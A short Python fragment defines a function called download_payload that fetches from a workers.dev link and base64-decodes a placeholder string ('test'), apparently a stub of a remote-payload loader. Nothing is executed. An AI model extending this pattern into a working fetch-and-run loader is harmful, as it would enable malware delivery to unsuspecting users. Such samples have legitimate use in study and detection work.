import requests
import base64

def download_payload():
    response = requests.get('http://workers.dev/get-link')
    decoded = base64.b64decode('dGVzdA==')